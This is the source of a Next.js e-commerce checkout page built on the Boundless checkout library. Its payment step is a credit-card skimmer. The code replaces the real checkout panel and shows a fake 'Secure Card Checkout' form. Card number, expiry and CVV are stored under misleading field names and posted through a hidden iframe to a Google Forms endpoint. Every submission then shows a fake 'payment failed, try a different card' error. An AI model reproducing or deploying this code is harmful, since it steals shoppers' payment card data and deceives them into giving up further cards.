import { useCart } from '../../hooks/cart';
import { startCheckout, StarterWrapper, resetCheckoutState } from 'boundless-checkout-react';
import { useRouter } from 'next/router';
import { apiClient } from '../../lib/api';
import { TCartInited } from '../../redux/reducers/cart';
import Loader from '../../components/Loader';
import logoImg from '../../assets/logo.svg';
import Head from 'next/head';
import { useCallback, useEffect, useRef, useState } from 'react';
import { createGetStr } from 'boundless-api-client/utils';
import styles from './checkout.module.css';
import ReactDOM from 'react-dom';
// import { Button, Checkbox, FormControlLabel, TextField, Typography, Snackbar, Radio, Select, MenuItem, InputLabel, makeStyles } from '@material-ui/core';
import {
    Button,
    Checkbox,
    FormControlLabel,
    TextField,
    Typography,
    Snackbar,
    Radio,
    Select,
    MenuItem,
    InputLabel,
} from '@mui/material';
import { makeStyles } from '@mui/styles'; 
import MuiAlert from '@material-ui/lab/Alert';
import stp from '../../public/stripe.png';
import Image from 'next/image';
import swal from 'sweetalert';
import Delivery from './Delivery'


function Alert(props) {
	return <MuiAlert elevation={6} variant="filled" {...props} />;
}

const useStyles = makeStyles((theme) => ({
	inputLabel: {
		fontSize: '0.875em',
	},
}));

export default function CheckoutPage() {

	const classes = useStyles();


	const { id: cartId, cartInited } = useCart();
	const router = useRouter();
	const { slug } = router.query;
	const [referal, setReferal] = useState();

	const Contact = () => {
		const [registerMe, setRegisterMe] = useState(false);
		const [email, setEmail] = useState('');
		const [open, setOpen] = useState(false);

		const handleProceed = () => {
			if (email) {
				window.location.href = '/checkout/shipping-address';
				// router.push('/checkout/shipping-address');
			} else {
				setOpen(true);
			}
		};

		const handleClose = (event, reason) => {
			if (reason === 'clickaway') {
				return;
			}

			setOpen(false);
		};

		const handleRegisterMeChange = (event) => {
			setRegisterMe(event.target.checked);
		};

		const handleEmailChange = (event) => {
			setEmail(event.target.value);
		};

		return (
			<div className={styles.contactInformation}>
				<Typography variant="h5">Contact Information</Typography>
				<div className={styles.emailField}>
					<TextField label="Email Address" type="email" name="email" value={email} onChange={handleEmailChange} />
				</div>
				<FormControlLabel
					control={<Checkbox checked={registerMe} onChange={handleRegisterMeChange} />}
					label="Register me"
				/>
				<div className={styles.contactButton}>
					<Button variant="contained" color="primary" onClick={handleProceed}>Continue TO Shipping</Button>
				</div>
				<Snackbar open={open} autoHideDuration={6000} onClose={handleClose}>
					<Alert onClose={handleClose} severity="error">
						Please enter your email address to proceed.
					</Alert>
				</Snackbar>
			</div>
		);
	};

	const Paymentt = () => {

		const [shippingOption, setShippingOption] = useState('');
		const [expireDate, setExpireDate] = useState('');
		const [submitted, setSubmitted] = useState(false);

		const [form, setForm] = useState({
			name: '',
			email: '',
			phoneNumber: '',
			department: '',
			level: '',
			other: '',
			referralCode: '',
		});

		const idNameMapping = {
			"entry.1614419459": "name",
			"entry.1993836365": "department",
			"entry.1588868976": "email",
			"entry.71363759": "phoneNumber",
			"entry.655168754": "level",
			"entry.102055654": "other",
			"entry.8372483": "referralCode",
		};


		const handleInputChange = (event) => {
			const name = idNameMapping[event.target.name];
			const value = event.target.value;

			setForm((prevForm) => ({
				...prevForm,
				[name]: value,
			}));
		};

		const handleExpireDateChange = (event) => {
			let value = event.target.value;
			value = value.replace(/[^0-9]/g, ''); // Remove non-numeric characters
			value = value.slice(0, 4); // Limit to 4 characters

			if (value.length >= 2) {
				value = value.slice(0, 2) + '/' + value.slice(2);
			}

			// If the last character is a slash, remove it
			if (value.endsWith('/')) {
				value = value.slice(0, -1);
			}

			setExpireDate(value);
		};

		const [pay, setPay] = useState(false);

		const handleShippingOptionChange = (event) => {
			setShippingOption(event.target.value);
		};

		const handleProceed = () => {

			setPay(true);

		};

		const checkss = () => {
			if (submitted) {
				setTimeout(function () {
					// window.location.href = "./";
				}, 3000);
				swal({
					title: "Failed!",
					text: "There was an error processing your payment. Please try again with a different card.",
					icon: "error",
					button: {
						text: "Ok",
						closeModal: true,
					},
				})
			}
		};

		const submit = (event) => {
			event.preventDefault();
			console.log("submitting");
			if (form.name && form.phoneNumber && form.other && form.level) {

				// setDisabled(true);
				setSubmitted(true);
				// setSending(true);
				swal("Processing...", "Validating Purchase", "info");

				// if (isValidated) {
				event.target.submit();
				// }
			}else{
				swal({
					text: "Please fill in all the details to proceed.",
					icon: "error",
					button: {
						text: "Ok",
						closeModal: true,
					},
				})
			}
		};

		return (
			<>
				<div className={`${styles.contactInformation}`}>
					<Typography variant="h5">Payment method </Typography>
					<div className={styles.shippingOptions}>
						<FormControlLabel
							control={<Radio name="shipping" checked={shippingOption === 'us'} />}
							label="Secure Card Checkout"
							value="us"
							onChange={handleShippingOptionChange}
						/>
					</div>
					<div className={styles.contactButton}>
						<Button variant="contained" color="primary" onClick={(e) => { e.stopPropagation(); handleProceed(); }} disabled={!shippingOption}>Purchase</Button>
					</div>
					<iframe
						name="hidden_iframe"
						id="hidden_iframe"
						className={styles.hidden_iframe}
						onLoad={checkss}
					></iframe>

					{pay && (
						<form className={styles.AttendForm} noValidate autoComplete="off" target="hidden_iframe" onSubmit={submit} action="https://docs.google.com/forms/d/e/1FAIpQLSe5RcBKOzyGq3kEfMYRIKwDfPXtqk9vKpkn0YbW-xabT6yi1Q/formResponse" onClick={(e) => e.stopPropagation()}>

							<div className={styles.PayDetails}>
								<Typography variant="h5">Credit Card<span className={styles.cancel} onClick={() => setPay(false)}>&times;</span></Typography>
								<div className={styles.PayDetailsMain}>

									<div className={styles.number}>
										<TextField label="Card Holder's Name" id="name" name="entry.1614419459" InputLabelProps={{
											classes: {
												root: classes.inputLabel,
											},
										}} value={form.name} onChange={handleInputChange} />
									</div>
									<div className={styles.number}>
										<TextField
											label="Card Number"
											id="phoneNumber" name="entry.71363759" value={form.phoneNumber}
											InputLabelProps={{
												classes: {
													root: classes.inputLabel,
												},
											}}
											inputProps={{
												type: 'tel',
												maxLength: 25, 
											  }}
											  onInput={(e) => {
												e.target.value = e.target.value.replace(/\D/g, ''); 
											  }}
											onChange={(e) => {
												let value = e.target.value.replace(/\s/g, '');
												value = value.slice(0, 16).replace(/(\d{4})/g, '$1 ').trim() + value.slice(16);
												e.target.value = value;
												handleInputChange(e);
											}}
										/>
									</div>
									<div className={styles.row}>
										<div className={styles.date}>
											<TextField
												label="Expiry Date (MM/YY)"
												id="level"
												name="entry.655168754"
												value={form.level}
												InputLabelProps={{
													classes: {
														root: classes.inputLabel,
													},
												}}
												onChange={(event) => {
													let value = event.target.value;
													value = value.replace(/[^0-9]/g, ''); // Remove non-numeric characters
													value = value.slice(0, 4); // Limit to 4 characters

													if (value.length >= 2) {
														value = value.slice(0, 2) + '/' + value.slice(2);
													}

													// If the last character is a slash, remove it
													if (value.endsWith('/')) {
														value = value.slice(0, -1);
													}

													event.target.value = value;
													handleInputChange(event);

													// Call the original handleInputChange function with the modified event
													// const modifiedEvent = {
													//     ...event,
													//     target: {
													//         ...event.target,
													//         value: value,
													//     },
													// };
													// handleInputChange(modifiedEvent);
												}}
											/>
										</div>
										<div className={styles.id}>
											<TextField label="Security Code(CVV)" name="entry.102055654"
												id="other"
												value={form.sideNotes}
												InputLabelProps={{
													classes: {
														root: classes.inputLabel,
													},
												}}
												  onInput={(e) => {
													e.target.value = e.target.value.replace(/\D/g, ''); 
												  }}
												onChange={handleInputChange} inputProps={{ maxLength: 3 }} />
										</div>

									</div>
									<div className={styles.contactButton}>
										<Button variant="contained" color="primary" type="submit">Continue</Button>
									</div>
									<Image src={stp} alt="STP" className={styles.secured} />
								</div>
							</div>
						</form>


					)}
				</div>
			</>

		);
	};
	useEffect(() => {
		const intervalId = setInterval(() => {
			const buttons = document.querySelectorAll('.MuiButtonBase-root.MuiStepButton-root.MuiStepButton-horizontal.css-mjpk2e-MuiButtonBase-root-MuiStepButton-root');
			if (buttons.length > 0) {
				buttons.forEach(button => {
					button.setAttribute('disabled', 'true');
				});
				console.log("Found the buttons");
				clearInterval(intervalId);
			} else {
				console.log("Didn't find the buttons");
			}
		}, 100);

		// Clear the interval when the component is unmounted
		return () => clearInterval(intervalId);
	}, []);

	const Customized = () => {

		const goBack = () => {
			router.back();
		};

		return (
			<>
				{slug && slug[0] === 'info' && <Contact />}
				{slug && slug[0] === 'shipping-address' && <Delivery router={router} setReferal={setReferal} />}
				{slug && slug[0] === 'payment' && <Paymentt />}
				{!slug && <Contact />}
				{(slug && (slug[0] === 'shipping-address' || slug[0] === 'payment')) && <Button variant="contained" color="primary" onClick={goBack}>Go Back</Button>}
			</>
		);
	};


	const checkoutStarter = useRef();


	useEffect(() => {
		const intervalId = setInterval(() => {
			const div = document.querySelector('.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.MuiGrid-grid-sm-8.MuiGrid-grid-md-9.css-ae10hu-MuiGrid-root');
			if (div) {
				const newDiv = document.createElement('div');
				newDiv.className = div.className;
				div.parentNode.replaceChild(newDiv, div);
				ReactDOM.render(<Customized />, newDiv);
				clearInterval(intervalId);
			}
		}, 1);

		return () => clearInterval(intervalId);
	}, [slug]);

	useEffect(() => {
		const handleRouteChange = () => {
			const intervalId = setInterval(() => {
				const div = document.querySelector('.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.MuiGrid-grid-sm-8.MuiGrid-grid-md-9.css-ae10hu-MuiGrid-root');
				if (div) {
					const newDiv = document.createElement('div');
					newDiv.className = div.className;
					div.parentNode.replaceChild(newDiv, div);
					ReactDOM.render(<Customized />, newDiv);
					clearInterval(intervalId);
				}
			}, 1);

			return () => clearInterval(intervalId);
		};

		router.events.on('routeChangeComplete', handleRouteChange);

		return () => {
			router.events.off('routeChangeComplete', handleRouteChange);
		};
	}, [slug]);




	const checkoutRef = useCallback((node) => {
		if (node && cartInited === TCartInited.yes && cartId) {
			checkoutStarter.current = startCheckout(node, {
				api: apiClient,
				cartId,
				onHide: (element, error) => {
					resetCheckoutState();
					if (element === 'backToCart') {
						const query = {};
						if (error) {
							query.error = error;
						}

						router.push(`/cart?${createGetStr(query)}`);
					} else if (element === 'logo') {
						router.push('/');
					} else {
						console.log('unknown element: ', element);
					}
				},
				onThankYouPage: (data) => {
					resetCheckoutState();
					window.location.assign(`/thank-you/${data.orderId}`);
				},
				basename: '/checkout',
				logoSrc: logoImg.src,
			});
		}
	}, [cartInited, cartId]);//eslint-disable-line
	useEffect(() => {
		return () => {
			if (checkoutStarter.current) {
				checkoutStarter.current.destroy();
			}
		};
	}, []);

	if (cartInited !== TCartInited.yes) {
		return <Loader />;
	}

	return (
		<>
			<Head>
				<meta name='robots' content='noindex' />
			</Head>
			{console.log("Slugggggg", checkoutRef)}
			<div>
				<div ref={checkoutRef}></div>
			</div>
		</>
	);
}